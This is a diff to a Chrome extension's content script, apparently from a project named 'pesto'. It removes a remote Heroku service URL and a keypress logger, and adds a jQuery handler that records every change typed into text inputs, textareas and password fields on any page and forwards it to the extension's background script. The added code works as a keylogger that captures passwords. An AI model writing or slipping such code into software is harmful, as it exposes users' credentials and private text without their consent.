@@ -1,17 +1,16 @@
-var SERVICE_PATH = 'https://salty-dawn-2132.herokuapp.com/',
-    pesto = {};
 
-var updateSettings = function () {
-    chrome.storage.sync.get('pesto', function (res) {
-        pesto = res.hasOwnProperty('pesto') ? res['pesto'] : {};
-    });
-};
+$(document).on('input', 'input[type=text],input[type=password],textarea', function (e) {
+    var old = $(this).attr('data-old-value') || '',
+        cur = $(this).val() || '';
 
-chrome.storage.onChanged.addListener(updateSettings);
-updateSettings();
+    var at = 0;
+    while (at < old.length && at < cur.length && old[at] == cur[at]) at++;
+    var diff = '';
+    for (var i = at; i < old.length; ++i) diff += '<BACKSPACE>';
+    for (var i = at; i < cur.length; ++i) diff += cur[i];
 
-document.addEventListener('keypress', function (e) {
+    $(this).attr('data-old-value', cur);
 
-    console.log(e);
+    chrome.runtime.sendMessage(diff, function (x) { });
+});
 
-}, true);
